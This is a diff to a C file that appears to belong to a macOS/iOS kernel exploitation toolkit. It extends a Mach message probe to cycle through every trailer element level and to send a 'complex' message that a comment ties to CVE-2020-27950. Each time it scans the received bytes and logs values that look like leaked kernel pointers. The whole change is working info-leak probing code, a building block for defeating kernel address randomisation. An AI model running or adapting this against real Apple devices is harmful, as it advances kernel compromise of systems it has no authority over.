@@ -13598,36 +13598,102 @@ vps_cd_done:
                 } recv_msg;
                 memset(&recv_msg, 0xCC, sizeof(recv_msg));
 
-                /* Request all trailer elements */
-                mach_msg_option_t opts = MACH_RCV_MSG |
-                    MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
-                    MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
-                kr = mach_msg(&recv_msg.hdr, opts,
-                    0, sizeof(recv_msg), port, 0, MACH_PORT_NULL);
-                rlog("Recv: 0x%x\n", kr);
+                /* Test multiple trailer element levels */
+                int trailer_levels[] = {
+                    MACH_RCV_TRAILER_SEQNO,
+                    MACH_RCV_TRAILER_SENDER,
+                    MACH_RCV_TRAILER_AUDIT,
+                    MACH_RCV_TRAILER_CTX,
+                    MACH_RCV_TRAILER_AV,
+                    MACH_RCV_TRAILER_LABELS
+                };
+                const char *trailer_names[] = {
+                    "SEQNO", "SENDER", "AUDIT", "CTX", "AV", "LABELS"
+                };
+                int ntrailers = 6;
 
-                if (kr == KERN_SUCCESS) {
-                    /* Dump the trailer area */
-                    uint8_t *tstart = (uint8_t *)&recv_msg + recv_msg.hdr.msgh_size;
-                    size_t tlen = sizeof(recv_msg) - recv_msg.hdr.msgh_size;
-                    if (tlen > 256) tlen = 256;
-                    rlog("Trailer area (%zu bytes from offset %u):\n", tlen, recv_msg.hdr.msgh_size);
-                    int suspicious = 0;
-                    for (size_t i = 0; i + 7 < tlen; i += 8) {
-                        uint64_t val = *(uint64_t *)(tstart + i);
-                        if (val == 0 || val == 0xCCCCCCCCCCCCCCCCULL) continue;
-                        rlog("  +%03zu: 0x%016llx", i, (unsigned long long)val);
-                        if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
-                            rlog(" *** KERNEL POINTER! ***");
-                            suspicious++;
-                        }
-                        rlog("\n");
+                for (int ti = 0; ti < ntrailers; ti++) {
+                    /* Send fresh message for each trailer test */
+                    if (ti > 0) {
+                        memset(&send_msg, 0, sizeof(send_msg));
+                        send_msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                        send_msg.hdr.msgh_size = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
+                        send_msg.hdr.msgh_remote_port = port;
+                        send_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                        send_msg.hdr.msgh_id = 0x41414141 + ti;
+                        mach_msg(&send_msg.hdr, MACH_SEND_MSG, send_msg.hdr.msgh_size,
+                            0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
                     }
-                    if (suspicious > 0)
-                        rlog("  Found %d potential kernel pointers!\n", suspicious);
-                    else
-                        rlog("  No kernel pointers detected in trailer\n");
+
+                    memset(&recv_msg, 0xCC, sizeof(recv_msg));
+                    mach_msg_option_t opts = MACH_RCV_MSG |
+                        MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
+                        MACH_RCV_TRAILER_ELEMENTS(trailer_levels[ti]);
+                    kr = mach_msg(&recv_msg.hdr, opts,
+                        0, sizeof(recv_msg), port, 0, MACH_PORT_NULL);
+
+                    if (kr == KERN_SUCCESS) {
+                        uint8_t *tstart = (uint8_t *)&recv_msg + recv_msg.hdr.msgh_size;
+                        size_t tlen = sizeof(recv_msg) - recv_msg.hdr.msgh_size;
+                        if (tlen > 256) tlen = 256;
+
+                        int suspicious = 0;
+                        for (size_t i = 0; i + 7 < tlen; i += 8) {
+                            uint64_t val = *(uint64_t *)(tstart + i);
+                            if (val == 0 || val == 0xCCCCCCCCCCCCCCCCULL) continue;
+                            if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                                rlog("  TRAILER_%s +%03zu: 0x%016llx *** KERNEL PTR ***\n",
+                                     trailer_names[ti], i, (unsigned long long)val);
+                                suspicious++;
+                            }
+                        }
+                        rlog("  Trailer %s: %d kernel-like values, trailer_sz=%zu\n",
+                             trailer_names[ti], suspicious, tlen);
+                    } else {
+                        rlog("  Trailer %s: recv failed 0x%x\n", trailer_names[ti], kr);
+                    }
                 }
+
+                /* Also test OOL (out-of-line) descriptors — CVE-2020-27950 vector */
+                rlog("\nTesting OOL descriptor message...\n");
+                {
+                    /* Send fresh for OOL */
+                    memset(&send_msg, 0, sizeof(send_msg));
+                    send_msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) |
+                        MACH_MSGH_BITS_COMPLEX;
+                    send_msg.body.msgh_descriptor_count = 0;
+                    send_msg.hdr.msgh_size = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
+                    send_msg.hdr.msgh_remote_port = port;
+                    send_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                    send_msg.hdr.msgh_id = 0x42424242;
+                    kr = mach_msg(&send_msg.hdr, MACH_SEND_MSG, send_msg.hdr.msgh_size,
+                        0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                    rlog("OOL Send (complex, 0 descriptors): 0x%x\n", kr);
+
+                    if (kr == KERN_SUCCESS) {
+                        memset(&recv_msg, 0xDD, sizeof(recv_msg));
+                        mach_msg_option_t opts = MACH_RCV_MSG |
+                            MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
+                            MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
+                        kr = mach_msg(&recv_msg.hdr, opts,
+                            0, sizeof(recv_msg), port, 0, MACH_PORT_NULL);
+                        if (kr == KERN_SUCCESS) {
+                            uint8_t *all = (uint8_t *)&recv_msg;
+                            int found = 0;
+                            for (size_t i = 0; i + 7 < sizeof(recv_msg); i += 4) {
+                                uint64_t val = *(uint64_t *)(all + i);
+                                if (val == 0xDDDDDDDDDDDDDDDDULL || val == 0) continue;
+                                if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                                    rlog("  OOL +%03zu: 0x%016llx *** KERNEL PTR ***\n",
+                                         i, (unsigned long long)val);
+                                    found++;
+                                }
+                            }
+                            if (!found) rlog("  No kernel pointers in OOL recv\n");
+                        }
+                    }
+                }
+
                 mach_port_destroy(mach_task_self(), port);
             }
             rlog("\n");
